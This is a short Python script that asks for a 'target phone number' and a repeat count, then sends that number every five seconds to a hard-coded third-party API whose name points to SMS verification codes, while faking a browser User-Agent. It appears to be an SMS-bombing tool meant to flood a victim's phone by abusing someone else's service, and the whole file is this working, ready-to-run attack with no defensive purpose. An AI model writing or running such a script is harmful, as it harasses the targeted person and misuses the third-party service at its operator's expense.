#!/usr/bin/env python
import urllib.request
import urllib.parse
from time import sleep

def send_request(phone_number):
    url = 'http://61.160.149.38:8050/etv/Api/getMesCode.do'
    postdata = urllib.parse.urlencode({
        'expire_after': 24,
        'role_id': 466,
        'auto_update_account': 1,
        'create_time': '',
        'remote_addr': '',
        'creator_accept_terms': 1,
        'mobile': phone_number,
        'password': '',
    }).encode('utf-8')
    req = urllib.request.Request(url, postdata)
    req.add_header('User-Agent',
                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36')
    file = urllib.request.urlopen(req)
    print(file.getcode())

def loop_rule():
    phone_number = input('input target phone number:')
    times = input("times:")

    for i in range(int(times)):
        send_request(phone_number)
        sleep(5)

if __name__ == '__main__':
    loop_rule()
